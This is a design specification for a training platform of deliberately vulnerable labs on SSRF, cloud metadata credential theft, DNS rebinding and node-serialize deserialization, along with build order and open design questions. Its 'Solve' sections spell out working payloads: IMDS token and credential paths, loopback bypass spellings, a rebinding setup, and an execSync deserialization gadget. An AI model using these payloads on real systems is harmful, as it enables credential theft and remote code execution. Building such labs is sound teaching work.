- **Goal.** Steal the server's IAM role credentials from the simulated "Citadel Cloud" metadata service.
- **Page.**
  - "Webhook tester": `url`, `method` (GET, POST, PUT), up to 3 header lines (`Name: value`) and a body (≤ 1 KiB).
  - The result shows the status, 5 response headers and the body (≤ 2 KiB).
  - The fetch trace and the sim panel.
  - A line naming the provider: "This server runs on Citadel Cloud (simulated; IMDS-compatible)."
- **IMDS** (A3): role `scriptorium-importer`; `SecretAccessKey` = the flag below Divine, `(sealed)` at Divine. The mode
  comes from the level file (`imdsMode`), so View Source shows the cloud configuration as part of the defense.
- **Level interface:** `imdsMode: 'v1' | 'v2-required'`, `send(net, req) → FetchView | string`.
- **Levels.**
  - **A**: IMDS `v1`; no checks; the method and headers as given.
  - **T**: IMDS `v1`. A denylist refuses URLs whose text contains `169.254.169.254`. The metadata host name
    `metadata.citadel.internal` (documented by the provider), decimal and IPv6 spellings all pass.
  - **I**: the same denylist, but IMDS is **`v2-required`** ("session tokens make metadata SSRF harmless", says the
    comment). Yet the tester lets the caller choose `PUT` and set headers, which is exactly how an IMDSv2 token is
    obtained.
  - **D**:
    - Resolve the host and refuse any non-public address (`isPublicAddress`, every spelling).
    - `pin`, no redirects, GET/POST only, and a header allowlist (`content-type`, `accept`; no `x-aws-*`).
    - IMDS `v2-required` stays as defense in depth.

    ASVS 5.0 V1 (SSRF), V13 (least privilege of the instance role, noted).
- **Flag proof.** The credentials JSON's `SecretAccessKey` (the flag) in the tester's response body.
- **Victim.** None.
- **Solve.**
  - A: `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/` → `scriptorium-importer` →
    `GET …/scriptorium-importer`.
  - T: the same paths on `http://metadata.citadel.internal/`.
  - I:
    1. `PUT http://metadata.citadel.internal/latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 60` → token;
    2. `GET …/iam/security-credentials/scriptorium-importer` with `X-aws-ec2-metadata-token: <token>`.
- **Matrix.**
  - `resisted` `That address is not allowed.` (D checks the address first).
  - legit: `GET http://scrolls.citadel.test/psalter.txt` → `200`.
  - malformed: a header line with no colon → `Invalid header line` at A/T/I.
  - privileged `null`.
  - Plus: T's GET at I → `401`; a token PUT carrying `X-Forwarded-For` → 403 (IMDS fidelity).
- **Seams.** `labFor().net`, `world.now` (token expiry).
- **Pitfalls.**
  - IMDS tokens are per instance and bounded (4); their TTL runs on the world clock.
  - Keep T's denylist on the URL **text** (that is the lesson); I keeps it on purpose and adds v2.
  - Distinct from SC-18: the target is the metadata service, and the I rung is about method and header control, not IP
    spellings.
- **Text.**
  - Title `{ id: 'SSRF ke Metadata Cloud (IMDS Palsu)', en: 'SSRF to Cloud Metadata (Fake IMDS)' }`.
  - Summary `{ id: 'Curi kredensial peran IAM server dari layanan metadata cloud yang disimulasikan.', en: "Steal the server's IAM role credentials from the simulated cloud metadata service." }`.
  - Hints:
    1. `{ id: 'Mesin cloud punya layanan metadata di alamat link-local yang terkenal.', en: 'Cloud machines have a metadata service at a well-known link-local address.' }`
    2. `{ id: 'Layanan itu juga punya nama host, dan alamat IP bisa ditulis dengan banyak cara.', en: 'That service has a host name too, and an IP address can be written many ways.' }`
    3. `{ id: 'Di Inquisitor layanan metadata meminta token sesi. Bagaimana token itu didapat, dan apakah penguji webhook ini bisa melakukannya?', en: 'At Inquisitor the metadata service wants a session token. How is that token obtained, and can this webhook tester do it?' }`

### SC-18 — SSRF blacklist bypass (decimal / IPv6) · `ssrf-ip-tricks` (levels A/I/D)

Maps `A01:2025`, `CWE-918`, `CWE-184`. State: `perSession` (net lab). Restart. Engine: **E5**.

- **Goal.** Reach the internal console on loopback although the server blocks local addresses.
- **Page.** "Mirror a scroll" (`url`), with the same result view, trace and panel as SC-16.
- **Level interface:** `allowed(net, url) → true | string`; then `net.fetch(url)`.
- **Levels.**
  - **A**: a denylist on the URL **text** (lower-cased substrings): `localhost`, `127.0.0.1`, `0.0.0.0`, `[::1]`,
    `169.254.169.254`, `10.`, `192.168.`. WHATWG canonicalises other spellings **after** the check.
  - **I**:
    - WHATWG parse.
    - If the host is an **IPv4** literal (already canonical dotted quad), refuse `0/8`, `10/8`, `127/8`, `169.254/16`,
      `172.16/12` and `192.168/16`.
    - If it is a name, resolve it and refuse those ranges in its **A** records.
    - IPv6 literals and AAAA answers are not examined ("we don't use IPv6").
  - **D**:
    - Resolve every address of both families, unmap IPv4-mapped addresses, and refuse anything `isPublicAddress`
      rejects.
    - `pin` the first address; no redirects.

    ASVS 5.0 V1.
- **Flag proof.** The preview contains `Master key: <flag>`.
- **Victim.** None.
- **Solve.**
  - A: `http://2130706433:8080/admin/keys`. Accepted alternatives: `0x7f.1`, `127.1`, `017700000001`, `0`,
    `[::ffff:7f00:1]`, `①②⑦.0.0.1`.
  - I: `http://[::1]:8080/admin/keys`. Accepted alternatives: `[::ffff:127.0.0.1]` (serialises to `[::ffff:7f00:1]`),
    `[::]`, or your DNS name with an AAAA record `::1`.
- **Matrix.**
  - `resisted` `That address is not allowed.`.
  - legit: `http://scrolls.citadel.test/psalter.txt` → `Psalter`.
  - malformed `[]`; privileged `null`.
  - Plus: a table spec of A's bypass spellings passing A and refused at I; IPv4-compatible `[::127.0.0.1]` is unroutable
    (`ETIMEDOUT`), as on Linux.
- **Seams.** `labFor().net`.
- **Pitfalls.**
  - The level's own checks must never call `isPublicAddress` below Divine.
  - The ground truth (`routeOf`) decides where the request goes. The lesson is the **gap** between the check and that
    truth.
  - Distinct from AR-10 T (a DNS name → private address) and SC-17: this lab is about **literal spellings and address
    families**.
- **Text.**
  - Title `{ id: 'Bypass Daftar Blokir SSRF (Desimal/IPv6)', en: 'SSRF Blacklist Bypass (Decimal/IPv6)' }`.
  - Summary `{ id: 'Jangkau konsol internal di loopback meski server memblokir alamat lokal.', en: 'Reach the internal console on loopback although the server blocks local addresses.' }`.
  - Hints:
    1. `{ id: 'Daftar blokir mencari teks alamat tertentu. Apakah 127.0.0.1 hanya punya satu ejaan?', en: 'The denylist looks for certain address text. Does 127.0.0.1 have only one spelling?' }`
    2. `{ id: 'Pengurai URL mengubah banyak ejaan IPv4 menjadi bentuk titik standar sebelum menyambung.', en: 'The URL parser turns many IPv4 spellings into the standard dotted form before connecting.' }`
    3. `{ id: 'Di Inquisitor setiap bentuk IPv4 dikenali. Bagaimana dengan keluarga alamat yang lain?', en: 'At Inquisitor every IPv4 form is recognised. What about the other address family?' }`

### SC-19 — SSRF via DNS rebinding · `ssrf-dns-rebinding` (levels A/I/D)

Maps `A01:2025`, `CWE-918`, `CWE-367`. State: `perSession` (net lab: DNS cache, records, server routes). Restart.
Engine: **E5**.

- **Goal.** Get past the link preview's safety check with a name whose answer changes.
- **Page.**
  - "Link preview with a safety check" (`url`): the server checks that the host resolves to public addresses, fetches,
    and shows `Preview: <first 200 chars>`.
  - The panel's "Your DNS" form supports rebinding records (`first`, `then`, `ttl`), and "Your server" supports routes.
  - A note: "the Archive's resolver caches answers for their TTL; saving a record restarts its answer sequence".
- **Level interface:** `preview(net, url) → FetchView | string`.
- **Levels.**
  - **A** (check, then use):
    - `addrs = net.lookup(host)`; every address must be public (the level's own range check), else `That address is not
      allowed.`.
    - Then `net.fetch(url)`, which **resolves again**.
    - With a TTL-0 rebinding record, the first query answers public and the second answers `127.0.0.1`. With TTL > 0 the
      cache returns the public answer twice, and the request lands on your own server.
  - **I** (pinned):
    - One lookup, the check, then `net.fetch(url, { pin: addrs[0], redirect: 'manual' })` and the level's own redirect
      loop.
    - A redirect to **another** host is re-checked from scratch. A redirect to the **same host name** is "already
      checked", so it is fetched **unpinned** (`net.fetch(location)`), which re-resolves.
  - **D**: resolve once per hop, check every address, pin each hop, and follow **no** redirects ("Redirects are not
    followed."). ASVS 5.0 V1 (SSRF: validate the address that is actually connected to).
- **Flag proof.** The preview contains `Master key: <flag>`.
- **Victim.** None.
- **Solve.**
  - A: record `rb` A `first 198.51.100.66`, `then 127.0.0.1`, TTL 0, then preview `http://rb.attacker.test:8080/admin/keys`.
  - I: the same record, plus your server route `/start` → `307 Location: http://rb.attacker.test:8080/admin/keys`, then
    preview `http://rb.attacker.test:8080/start`. The pinned first hop reaches your server, which listens on every port;
    the same-host redirect re-resolves to loopback.
- **Matrix.**
  - Each script re-saves the record first (resetting its sequence).
  - `resisted` map: `{ acolyte: 'Preview: ok', inquisitor: 'Redirects are not followed.' }`. At D the pinned hop reaches
    your server's default `ok`.
  - legit: `http://scrolls.citadel.test/hours.txt` → `Preview: Book of Hours`.
  - malformed `[]`; privileged `null`.
  - Plus: the A exploit with TTL 60 fails (cached); moving `world.now` past the TTL between the check and the fetch is
    impossible within one request (the spec documents it); A's exploit at I lands on your server (attacker log hit,
    no flag).
- **Seams.** `labFor().net`, `world.now`.
- **Pitfalls.**
  - The rebinding counter is per record and resets on save. A second preview without re-saving sees `then` already at
    the check, and is refused. The page says so.
  - The DNS log shows each authoritative query, which is the player's best debugging tool.
  - Distinct from AR-10 I (a record edited **between** two requests) and SC-18 (spellings).
- **Text.**
  - Title `{ id: 'SSRF lewat DNS Rebinding', en: 'SSRF via DNS Rebinding' }`.
  - Summary `{ id: 'Lewati pemeriksaan keamanan pratinjau tautan dengan nama yang jawabannya berubah.', en: "Get past the link preview's safety check with a name whose answer changes." }`.
  - Hints:
    1. `{ id: 'Pemeriksaan mencari alamat sebuah nama. Berapa kali nama itu dicari dalam satu pratinjau?', en: 'The check looks up a name. How many times is that name looked up in one preview?' }`
    2. `{ id: 'Anda mengendalikan DNS attacker.test, termasuk TTL setiap jawaban.', en: "You control the DNS of attacker.test, including each answer's TTL." }`
    3. `{ id: 'Di Inquisitor alamat pertama dikunci. Apa yang terjadi bila server Anda mengalihkan ke host yang sama?', en: 'At Inquisitor the first address is pinned. What happens when your server redirects to the same host?' }`

### SC-20 — Insecure deserialization (node-serialize) · `insecure-deserialization` (levels A/T/I/D)

Maps `A08:2025`, `CWE-502`. State: the cookie is client-held; the server keeps only the D signing key (`perSession`). No
Restart. Engine: **E9** (E4).

- **Goal.** Make the simulated server run a command through your preferences cookie, and read its flag file.
- **Page.**
  - "Reading-room preferences". A form (`name` ≤ 40, `motto` ≤ 80, `theme` ∈ `vellum | candle | night`) sets the cookie
    `scriptorium_prefs_<level>` = base64 of the app's `serialize(prefs)` (node-serialize format: plain JSON for data).
    The cookie is **not** HttpOnly; the page says how to edit it (devtools, `curl -b`).
  - The page greets `Welcome back, <name> — <motto>` (escaped).
  - Below Divine, the page shows "Commands the simulated server ran" (`shellCalls`, escaped).
  - The page explains: "This app restores your preferences with a node-serialize-style `unserialize`: any string that
    starts with `_$$ND_FUNC$$_` becomes a function. Nothing runs on the real server: a simulated Node.js inside a
    sandbox answers, and its shell can only read the files it was given."
- **Execution.** `unserializeInSandbox({ text, render: ['name', 'motto'], node: { files: { '/srv/scriptorium/flag':
  <flag below Divine> } } })` (E9).
- **Level interface:** `restore(text: string) → { ok: true, sandbox: true } | { ok: true, prefs } | { ok: false, text }`.
  It is the pre-check, and D's own parser.
- **Levels.**
  - **A**: base64-decode, then the sandboxed unserialize and render.
  - **T**: refuses when the decoded **text** contains `_$$ND_FUNC$$_` (`Preferences rejected: serialized functions are
    not allowed.`). JSON may write the same characters as `$` escapes, which `JSON.parse` (inside unserialize)
    turns back into `$`.
  - **I**:
    - The host `JSON.parse`s first and walks every string value (≤ 64 values, depth ≤ 8).
    - A value starting with the prefix and ending in an immediate call (`/\}\s*\(\s*\)\s*;?\s*$/`) is refused
      (`Preferences rejected: functions that run on load are not allowed.`).
    - Other functions are allowed ("themes store formatter functions").
    - The renderer then coerces fields to strings, which calls a restored `toString`.
  - **D**:
    - The cookie is `base64url(JSON).HMAC-SHA256` under a per-instance key.
    - `JSON.parse` with a schema (strings ≤ 40/80, theme enum).
    - No functions are ever restored and the sandbox is never called. Anything invalid is reset to defaults (`Your
      preferences were reset.`).

    ASVS 5.0 V1 (no deserialization of untrusted data into code), V11 (integrity of client-held state).
- **Flag proof.** The greeting (or the error text) contains the planted flag, read through the fake shell. `shellCalls`
  lists `cat /srv/scriptorium/flag`.
- **Victim.** None.
- **Solve.**
  - A: `{"name":"x","motto":"_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /srv/scriptorium/flag').toString()}()"}`,
    base64.
  - T: the same with `$` written as `$` inside the JSON string.
  - I: `{"name":"x","motto":{"toString":"_$$ND_FUNC$$_function(){return require('child_process').execSync('cat /srv/scriptorium/flag').toString()}"}}`.
    `}.call()` instead of `}()` is an accepted alternative.
- **Matrix.**
  - `send` uses `bare(app, sid, 'scriptorium_prefs_<level>=<b64>')`, then GETs the page. The cookie is named after the
    level it is **sent to** (RECIPES §6).
  - `resisted` `Your preferences were reset.`.
  - legit: the page's own form round trip (`name=Ilse&motto=Ora et labora`) → `Welcome back, Ilse`.
  - malformed: base64 of `{` → `Preferences error` at A/T/I.
  - privileged `null`.
  - Plus: no host `eval`, `vm` or `Function` is reached (E9 guard); a template loop is stopped by the sandbox deadline
    (`limit: 'timeout'`); `POST <lab>/_reset` is 404.
- **Seams.** `prefsKey(sid, 'divine')`, `serialize(prefs)`.
- **Pitfalls.**
  - The unserialize semantics are library behaviour, fixed in E9 and the same at A/T/I. The **app's** choices (what it
    checks, and that it unserializes untrusted input at all) are the level files.
  - Bound the cookie at 4 KiB before base64-decoding.
  - Show the output and errors escaped.
  - The fake shell plants the flag only below Divine.
  - Distinct from FP-07 (template injection): the gadget here is the serialization format itself.
- **Text.**
  - Title `{ id: 'Deserialisasi Tidak Aman (node-serialize)', en: 'Insecure Deserialization (node-serialize)' }`.
  - Summary `{ id: 'Buat server yang disimulasikan menjalankan perintah lewat cookie preferensi Anda dan baca berkas benderanya.', en: 'Make the simulated server run a command through your preferences cookie and read its flag file.' }`.
  - Hints:
    1. `{ id: 'Cookie preferensi berisi objek yang diserialisasi. Apa yang bisa disimpan format itu selain data?', en: 'The preferences cookie holds a serialized object. What can that format store besides data?' }`
    2. `{ id: 'Penyaring Templar membaca teks sebelum JSON diurai. Bisakah JSON menulis karakter yang sama dengan cara lain?', en: "Templar's filter reads the text before the JSON is parsed. Can JSON write the same characters another way?" }`
    3. `{ id: 'Di Inquisitor fungsi yang langsung memanggil dirinya ditolak. Kapan lagi aplikasi memanggil fungsi pada objek Anda tanpa disuruh?', en: 'At Inquisitor functions that call themselves are refused. When else does the app call a function on your object without being asked?' }`

---

## C. Ordering, dependencies, and flagged design changes

### C1. Step-up audit (each rung's exploit, and why the next rung refuses it)

| Lab | A exploit → refused above by | T exploit → refused above by | I exploit → refused at D by |
|---|---|---|---|
| AR-01 | `__schema` → T's text filter | `__type` → D: introspection rule + curator authz | — |
| AR-02 | `scroll(id:1)` → T: entry-point check | `user{scrolls}` → I: edge filtered, global ids | `node(id)` → D: one `canRead` |
| AR-03 | JSON array batch → I: arrays refused | — | aliases → D: once per document, per-call charge |
| AR-04 | 41 top-level aliases → I: alias count | — | aliases in named fragments → D: counted expanded + cost |
| AR-05 | depth 13 → I: depth 6 | — | `first:1000` → D: `first` ≤ 25 + cost |
| AR-06 | inline `'` → T: WAF strips `'` | variables → I: parameterized search | unquoted `ID` list → D: `^\d+$` + `?` per id |
| AR-07 | v1 without a key → T: key required | v1 with a key → D: 410 retired | — |
| AR-08 | `role` → T: denylist | `Role` (case fold) → I: exact allowlist | JSON Patch op → D: diff of the result |
| AR-09 | override header after the guard → T: guard reads it | alternative override header → I: override first | `PURGE` → D: action table, 405 |
| AR-10 | internal name → T: text denylist | DNS name → private → I: registration resolves | record edited later → D: checked at delivery |
| AR-11 | unsigned → T: header required | empty `v1=` → I: exact compare | replay → D: tolerance + ids |
| AR-12 | key literal → T: obfuscated (grep fails) | decode / source map → D: no key shipped | — |
| AR-13 | SQL via upstream title → I: parameterized | — | upstream 308 → internal → D: no redirects |
| AR-14 | any Origin → T: substring check | `citadel.test.attacker.test` → I: exact list | `Origin: null` → D: no null, Lax, ticket |
| AR-15 | `join curators` → T: join checked | `history` → I: every op checks `room` | `roomId` → D: exact schema |
| SC-12 | overlong UTF-8 → I: strict decoding | — | full-width + NFKC → D: ASCII allowlist + containment |
| SC-13 | UA poison + `/var/log` → I: confined to `/srv/app` | — | app.log poison → D: page map |
| SC-14 | DOCTYPE in document.xml → T: prefilter | DOCTYPE in core.xml → I: no external general entities | external DTD out-of-band → D: refuse DOCTYPE |
| SC-15 | `file://` entity → T: `file://` text filter | scheme-less system id → I: DOCTYPE refused | XInclude → D: XInclude off |
| SC-16 | `localhost` → T: prefix allowlist | userinfo `@` → I: exact host | CDN `/go` redirect → D: hop re-check |
| SC-17 | IMDS v1 by IP → T: IP-text denylist | host alias, GET → I: IMDSv2 | PUT token + header → D: address check |
| SC-18 | decimal/hex/octal → I: canonical IPv4 check | — | IPv6 / mapped → D: both families |
| SC-19 | rebinding TTL 0 → I: pinned first hop | — | same-host 307 → D: no redirects |
| SC-20 | prefix + IIFE → T: text denylist | `$` escapes → I: post-parse IIFE check | `toString` gadget → D: signed JSON, no functions |

### C2. Build order

Engine tasks come first, each with a gate. Then the lab batches, sequential, one implementer per batch, with a combined
review per batch (the controller's current loop). Engine tasks may run in parallel worktrees **beside** lab batches that
do not depend on them, as E1/E2 did in Phase 2.

1. **S3** — Phase 3 shared template: the `archive-api` district + `api-lab` shell; `simInclude`; RECIPES section stubs.
   Gate.
2. **AR-A** (needs only S3): **AR-07, AR-08, AR-09, AR-12**. REST shape (API key, JSON errors, route-local body
   parsers, GK-13-style `install`). It can start as soon as S3 merges, while E5/E7 are built.
3. **E5** (`core/sim` network) ∥ **E7** (`core/graphql`). Two gates.
4. **AR-B** (E7): **AR-01, AR-02, AR-06**. Schema, introspection, authorization and SQL through GraphQL. Its first
   commit adds `archive-api/_shared/graphql-lab.ts` (console view, `send` helper, `describeGraphqlLab` test kit).
5. **AR-C** (E7): **AR-03, AR-04, AR-05**. The resource rungs: limiter, aliases, depth/cost.
6. **SC-B** (E5): **SC-16, SC-17, SC-18, SC-19**. Its first commit is `scriptorium/_shared/net-lab.ts` (console, CDN,
   fetch view, test kit).
7. **XO** (E5 for AR-10/13; none for AR-11): **AR-10, AR-11, AR-13**. Webhooks out and in, and upstream trust.
8. **E6** (`core/xmldtd`). Gate. It can start once E5's types are stable; its `xmlResolver` test needs E5 merged.
9. **SC-C** (E5 + E6 + E2): **SC-14, SC-15**.
10. **E8** (`core/ws` + sim socket). **Waits for E1 to merge.** Gate.
11. **AR-E** (E8): **AR-14, AR-15**.
12. **E9** (sandboxed `unserialize`). **Waits for E4 to merge.** Gate.
13. **SC-P** (S3 for SC-12/13, E9 for SC-20): **SC-12, SC-13, SC-20**. If E9 is late, SC-12 and SC-13 run right after
    AR-A, and SC-20 follows E9 as a one-lab batch.

**Two batches have two labs:**

- **SC-C:** each XXE lab carries an upload, a zip or SVG pipeline, and a parser matrix. They share every fixture and
  the parser options table, and nothing else fits that shape.
- **AR-E:** both socket labs need E8 and its integration tests. AR-14 alone is victim-driven. Padding either batch with
  an unrelated lab would only lengthen its review.

**Final gate:** `npm run gen:catalog` shows 24 more ✅ rows; `npm run gate:catalog` counts them; the full suite,
`npm run typecheck`, `npm run verify:dist`, and (when Docker runs) `npm run verify:docker`. One new docker check: a
WebSocket echo through the proxy on `127.0.0.1:1337`.

### C3. Dependency table (lab → engine tasks)

| Lab | S3 | E5 net | E6 xmldtd | E7 graphql | E8 ws | E9 deser. | Phase 2 engine reused |
|---|---|---|---|---|---|---|---|
| AR-01, AR-02, AR-04, AR-05 | ✓ | | | ✓ | | | — |
| AR-03 | ✓ | | | ✓ | | | — |
| AR-06 | ✓ | | | ✓ | | | `challengeDb`, `districts/_shared/sql.ts` |
| AR-07, AR-08, AR-09, AR-12 | ✓ | | | | | | GK-13 `install` pattern; GK-14 `isDangerousKey` (AR-08) |
| AR-10 | ✓ | ✓ | | | | | sim world, attacker log |
| AR-11 | ✓ | | | | | | — |
| AR-13 | ✓ | ✓ | | | | | `challengeDb` |
| AR-14 | ✓ | | | | ✓ | | **E1** (SameSite jar, `visitAttackerPageAction`), victim presets |
| AR-15 | ✓ | | | | ✓ | | — |
| SC-12 | ✓ | | | | | | `simFs` |
| SC-13 | ✓ (`simInclude`) | | | | | | `simFs` |
| SC-14 | ✓ | ✓ | ✓ | | | | **E2** (`readZip`, upload), `simFs` |
| SC-15 | ✓ | ✓ | ✓ | | | | **E2** (upload), `simFs` |
| SC-16, SC-17, SC-18, SC-19 | ✓ | ✓ | | | | | sim world |
| SC-20 | ✓ | | | | | ✓ | **E4** (QuickJS sandbox, fake Node) |

### C4. Flagged design changes from the catalog and plan (with reasons)

1. **SC-12 title.** It changes from "Path traversal Unicode/double-encode" to "Path traversal via Unicode
   normalisation".
   - Why: the binding amendment forbids repeating SC-11's double-encoding lesson. The lab teaches overlong UTF-8 (A) and
     NFKC-after-check (I).
   - Unchanged: the id, levels (A I D) and map.
   - Needs: `src/catalog.ts` row 90 and `npm run gen:catalog` (Q10).
2. **No level-set changes.** All 24 rows keep their sets.
   - The A/T/D rows (AR-01, AR-07, AR-12) and the A/I/D rows (AR-03/04/05/13, SC-12/13/18/19) were audited. Each lacks
     a fourth **distinct** rung, so the catalog is right to omit one.
   - AR-03's Templar would duplicate GK-03's request-counting lesson; SC-18's Templar would be a second text denylist.
3. **P0-SEC "mock services as compose services" is superseded.** The fake IMDS, internal services, DNS (incl.
   rebinding) and the attacker server are **in-process** (`simNet`). No compose service is added (Q4). The plan's Phase 3
   line "require the `metadata`/internal network mocks from P0-SEC and the sandbox worker" becomes: E5 for the network,
   and E4's QuickJS worker for SC-20 (no container).
4. **SC-13 "RCE" and SC-20 "node-serialize" are simulated** (owner decision Q7):
   - SC-13's include is `simInclude` (marker statement).
   - SC-20 runs a node-serialize-**compatible** `unserialize` written from scratch inside QuickJS, with E4's fake shell.
     No `node-serialize` package is added (it is unmaintained and would be host-side `eval`).

   The titles stay; they name the technique.
5. **SC-17's IMDS uses AWS-compatible paths and headers** under a fictional provider name ("Citadel Cloud"), because
   those paths are what the lesson teaches and what tools probe (Q5).
6. **CSWSH and CSRF-style cookie attributes are a per-level decision in level files.** AR-14's A/T/I cookie is
   `SameSite=None; Secure` and D's is `Lax` (Phase 2 flagged change 5, carried over), so implementers don't "fix" it.
7. **New platform behaviour.** These are not lab flaws: the upgrade listener and its Origin guard, the `/ws/frames`
   fallback, the reserved `/sim/` lab prefix, and empty victim actions with `net` (Q3, Q8, Q11).

---

## D. Open questions for the controller (each with a recommended answer)

**Q1 — `graphql@16.14.2` as a runtime dependency (AR-01…06)?**

- 2.1 MB unpacked, zero dependencies, published 2026-06-09 (the newer 16.15.0 is under two weeks old).
- Measured: its `OverlappingFieldsCanBeMergedRule` is quadratic (1000 same-key fields: 3.5 s). With that rule replaced
  by our linear one, the worst case under the caps validates in about 13 ms.
- It gives introspection that real tools accept, and exact error texts.

**Recommended: accept**, with the rule swap and every bound in `core/graphql/`. If refused, E7 implements the same API by
hand (about 1,400 lines; see A1).

**Q1b — If Q1 is refused: `graphql@16.14.2` as a devDependency only**, for the conformance spec? **Recommended:
yes.** It never reaches the production image (`npm ci --omit=dev`) and keeps the hand-rolled engine honest against
tools.

**Q2 — `ws` or a hand-rolled RFC 6455 server?** `ws@8.22.0` is 154 KB with zero dependencies, but has had DoS CVEs. We
need text frames only, no extensions, and strict caps, which is about 350 lines. **Recommended: hand-rolled
(`core/ws/`)**, with Node 22's global `WebSocket` (measured working; no dependency) as the test client. Fallback: `ws`
in `noServer` mode with `maxPayload` and `perMessageDeflate: false`, if the review finds the framing code risky.

**Q3 — The upgrade listener on the HTTP server** (`app.locals.upgrade`, attached in `lifecycle.listen()` and the test
`serve()`). It re-applies, outside Express:

- the Host guard;
- a **new platform Origin guard** (a present `Origin` must be a loopback/allowed host; a missing one is allowed);
- no session minting (`hvwa_sid` required);
- caps (32 sockets in all, 4 per session).

**Recommended: approve**, and document it in `docs/SECURITY.md` ("a website you visit cannot open a socket into your
lab; the CSWSH lesson is simulated"). No nginx change: the upgrade headers are already forwarded.

**Q4 — In-process `simNet`, or compose mock services, for SSRF?** Compose would mean four extra services in 512 MB,
labs that only work under Docker, nondeterministic tests, a real authoritative DNS for rebinding, and the app's first
real outbound socket code. **Recommended: in-process `simNet`** (A3), with no compose change and the existing
`core/sim` no-network guard extended. This updates the P0-SEC note.

**Q5 — IMDS fidelity.** The fake metadata service uses AWS-compatible paths and headers (`/latest/api/token`,
`X-aws-ec2-metadata-token`, `security-credentials/<role>`) under a fictional provider, "Citadel Cloud", and the page says
"simulated; IMDS-compatible". **Recommended: approve.** Those exact paths are the transferable skill.

**Q6 — SC-20's execution model.** **Recommended: E9**: a node-serialize-compatible `unserialize` and the app's render
step run **inside E4's QuickJS sandbox** with the fake Node shell. It needs no new dependency and no host eval, and it
matches FP-07's approved boundary. Fallback, only if E4 is not merged: a host-side marker interpreter (regex IIFE
classification and an `hvwa()` marker). That is less faithful, and its I rung (the `toString` gadget) becomes a pattern
match.

**Q7 — XXE parser separate from `core/xss/xml.ts`?** **Recommended: yes, a separate `core/xmldtd/`.** The ≈30 lines of
XML character-class tables are copied, with a spec asserting the two copies agree, so the E0 oracle's import guard and
pinned Chrome rows are untouched. The new parser never feeds the oracle.

**Q8 — Victim-panel extensions for server-side labs:**

- `VictimConfig.net` with **empty** `actions` allowed;
- engine routes `POST <lab>/sim/dns|server[/clear]`, with `/sim/` reserved like `/victim/`;
- the panel sections "Your DNS", "Your server" and "What the server's fetcher did";
- `simWorld({ inbox: false })`, which saves 576 KiB per SSRF instance.

**Recommended: approve**, as part of E5.

**Q9 — Attacker-log growth.** Hits gain `from: 'browser' | 'server' | 'dns'` and up to 8 headers on server hits. DNS
queries to the player's zone are logged (Collaborator-style). `attackerLogWeight` is re-measured, and `attackerHits()`
reads the new fields. **Recommended: approve.** The out-of-band XXE, webhook and rebinding labs are invisible without it.

**Q10 — SC-12's catalog title** → "Path traversal via Unicode normalisation" (C4.1). **Recommended: approve.**

**Q11 — `POST <lab>/ws/frames`, the HTTP fallback transport for socket labs.** Same `SocketApp`, same Origin guard and
cookies, no CORS. It makes the labs curl-playable and lets `describeExploitMatrix` drive them; one real-WebSocket
integration spec per lab keeps the real transport honest. **Recommended: approve.**

**Q12 — The simulated internet is the three TEST-NETs.** `isPublicAddress` treats `192.0.2/24`, `198.51.100/24` and
`203.0.113/24` as public, so the attacker server and the scroll CDN stay reachable at Divine. Every IANA
special-purpose range is otherwise denied. **Recommended: approve**, documented in `ip.ts` and RECIPES §15.

**Q13 — Raw webhook bodies (AR-11) without a platform change.** Pilgrim Pay sends `application/pilgrimpay+json`, which
the app-wide `express.json()` (exact `application/json`) ignores, and the route reads it raw. The alternative was a
`verify` hook on the global JSON parser, keeping `rawBody` for every request. **Recommended: the custom media type**
(no platform change). The spec pins that the global parser leaves it alone.

**Q14 — Memory ledger.** New capped instances:

| Lab kind | Contents | Weight |
|---|---|---|
| SSRF | world without inbox + simNet | ≈1 MiB |
| XXE | world + simNet + simFs | ≈1.4 MiB |
| AR-14 | world + browser | ≈1.5 MiB |

The 96 MiB process budget still bounds the total, at the cost of more evictions under heavy multi-lab play.
**Recommended: keep the budget**, and run the pre-Phase-3 ledger review the execution notes already call for. No lab
here keeps a limiter in capped state (AR-03's limiter is plain `perSession`).

**Q15 — Intent routing for the Archive landing pages.** Relic Market's `mountIntents` lives in
`relic-market/_shared/`, and a district may not import another's. **Recommended: move `mountIntents`, `refusal`,
`success` and `endpointsOf` to `src/districts/_shared/intents.ts`** in S3, re-exported from `relic-market/_shared` (as
Q1 of the RM design did for curl). The fallback is a small copy in `archive-api/_shared`.

**Q16 — No GraphiQL.** Vendoring it pulls React and a large bundle into the offline image. **Recommended: a JSON
request console on each GraphQL lab page** (raw body textarea; batches are arrays), plus curl lines and "point your own
client at `<lab>/graphql`".

**Q17 — AR-01's seal is per level, not per session** (one schema per level). As with GK-01's accepted perLevel
secrets, players at the same level could share a seal, while flags stay per session. **Recommended: accept** (Q5 of the
RM design).

**Q18 — Security headers.** No global header or CSP change anywhere in Phase 3. AR-12's JavaScript is lab-authored and
served from a lab route with nosniff; socket labs need no header. **Recommended: confirm.**

---

## Owner + controller decisions (2026-11-17, binding)

**Owner (answered by the project owner):**
- **Q1 GraphQL:** use `graphql@16.14.2` as a runtime dependency (exact pin), with the quadratic `OverlappingFieldsCanBeMergedRule` replaced by a linear one and every bound enforced in `core/graphql/`.
- **Q2 WebSocket:** hand-rolled text-only RFC 6455 server in `core/ws/` (no `ws` dependency); Node 22's global `WebSocket` as the test client. Fallback to `ws` only if review finds the framing code risky.
- **Q3 Upgrade listener:** approved — re-applies the Host guard, requires an existing `hvwa_sid` (no minting), caps sockets (32 total / 4 per session), and adds a platform Origin guard (a present Origin must be loopback/allowed). Documented in `docs/SECURITY.md`: a website you visit cannot open a socket into your lab; CSWSH is simulated.
- **Q4 SSRF:** in-process `simNet` (simulated DNS with TTL/rebinding, fake IMDS, attacker.test server, IP ground truth) — no compose services; supersedes the P0-SEC note about mock services.

